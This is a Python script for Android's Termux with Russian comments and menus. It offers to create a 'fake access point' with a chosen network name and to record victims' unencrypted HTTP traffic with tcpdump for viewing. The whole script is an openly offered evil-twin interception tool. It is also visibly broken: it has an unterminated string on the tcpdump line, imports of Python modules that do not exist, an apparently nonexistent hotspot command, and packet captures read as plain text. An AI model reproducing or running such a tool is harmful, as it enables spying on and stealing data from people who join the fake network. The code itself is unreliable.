#!/data/data/com.termux/files/usr/bin/python

import os
import subprocess
import threading
import time
import signal
import termuxapi
import tcpdump

# Функция для установки зависимостей
def install_dependencies():
    os.system('pkg install termux-api tcpdump python -y')

# Функция для создания фейковой точки доступа
def create_fake_ap(ssid):
    os.system(f'termux-wifi-hotspot start --ssid {ssid}')

# Функция для прослушивания HTTP трафика
def listen_http_traffic(output_file):
    os.system(f'tcpdump -i wlan0 -w {output_file} tcp port 80 &
    pid = os.getpid()
    signal.signal(signal.SIGINT, lambda sig, frame: os.kill(pid, signal.SIGTERM))

# Функция для показа захваченных данных
def show_captured_data(output_file):
    with open(output_file, 'r') as file:
        print(file.read())

# Функция для отображения статистики подключенных клиентов
def show_statistics():
    os.system('termux-wifi-hotspot status')

# Функция для сохранения данных
def save_data(data, filename):
    with open(filename, 'a') as file:
        file.write(data + '\n')

# Основная функция
def main():
    install_dependencies()
    ssid = input('Введите название сети для фейковой точки доступа: ')
    output_file = 'captured_data.txt'
    data_folder = 'wifi_data'

    if not os.path.exists(data_folder):
        os.makedirs(data_folder)

    while True:
        print('\n1. Создать фейковую точку доступа\n2. Слушать HTTP трафик\n3. Показать захваченные данные\n4. Показать статистику подключенных клиентов\n5. Выход\n')
        choice = input('Выберите действие: ')

        if choice == '1':
            create_fake_ap(ssid)
            print('Фейковая точка доступа создана.')
        elif choice == '2':
            listen_http_traffic(output_file)
            print('Слушаю HTTP трафик. Нажмите Ctrl+C для остановки.')
        elif choice == '3':
            show_captured_data(output_file)
        elif choice == '4':
            show_statistics()
        elif choice == '5':
            print('Выход. Все данные сохранены в папку wifi_data.')
            break
        else:
            print('Неверный выбор. Попробуйте снова.')

if __name__ == '__main__':
    main()